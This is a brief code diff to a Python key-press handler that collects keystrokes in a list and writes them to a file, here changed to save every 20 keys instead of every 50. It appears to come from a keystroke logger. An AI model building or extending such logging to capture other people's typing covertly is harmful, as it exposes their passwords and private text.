@@ -10,7 +10,7 @@ def on_press(key):
 	keys.append(key)
 	count +=1
 	
-	if count >= 50:
+	if count >= 20:
 		count = 0
 		write_file(keys)
 		keys = []
